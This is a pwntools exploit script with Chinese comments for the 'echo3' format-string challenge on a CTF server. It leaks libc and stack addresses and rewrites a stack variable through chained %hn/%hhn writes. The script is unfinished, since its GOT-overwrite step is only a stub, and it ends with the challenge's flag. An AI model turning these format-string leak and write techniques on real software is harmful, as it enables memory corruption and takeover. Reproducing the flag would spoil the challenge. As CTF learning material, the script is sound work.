#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
{32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
20

栈上制造空间一共20种情况

b *0x08048737  read magic
b *0x08048774  分配栈空间
b read + 5
b *0x08048646  printf

%18$p#%18$s  # 读取ebp，和下一个ebp的地址

"""


import re, sys, os.path as path
from pwn import *
from pwnlib import gdb


context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3_norandom_patched")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
libc = elf.libc


class A:
    random_n = 0  # TODO: 随机化情况需要修改
    ebp0addr = 0
    ebp1addr = 0
    p0idx = 88 // 4
    p1idx = (316 + random_n) // 4
    p0addr = 0
    p0addr = 0

    @staticmethod
    def main():
        # 获取libc与栈地址
        payload = "%18$p#%19$p#%34$p#%35$p$$$$$$$$\0"
        io.sendline(payload)
        r = io.recvuntil("$$$$$$$$", drop=True)
        a = r.split(b"#")
        assert a[1] == b"0x804877b" and a[2] == b"(nil)"
        A.ebp1addr = int(a[0], 16)
        log.info("ebp1addr = 0x%x", A.ebp1addr)
        libc_addr = int(a[3], 16)
        log.info("libc_addr = 0x%x", libc_addr)
        libc.address = (libc_addr - 0x18000) & 0xfffff000
        log.info("libc_basse = 0x%x", libc.address)

        # 获取变量i的地址
        A.ebp0addr = A.ebp1addr - A.random_n * 4 - 64
        log.info("ebp0addr = 0x%x", A.ebp0addr)
        i_addr = A.ebp0addr - 0x14
        log.info("i_addr = 0x%x", i_addr)

        # 修改变量i：一些变量初始化工作
        A.p0addr = A.ebp1addr + (88 - 72) * 4
        log.info("p0addr = 0x%x", A.p0addr)
        A.p1addr = A.ebp1addr + (316 - 72) * 4
        log.info("p1addr = 0x%x", A.p1addr)

        # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
        # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
        assert (i_addr + 3) & 0x0000ffff == (i_addr & 0x0000ffff) + 3  # 为了修改最高位，使其变为负数
        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=A.p0idx, data=(i_addr + 3) & 0x0000ffff)
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)
        payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=A.p1idx, data=0x80)
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)

        # 在栈上写入got.printf的四个地址


    @staticmethod
    def write(target_addr, one_byte):
        pass



def main():
    A.main()
    io.interactive()


if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}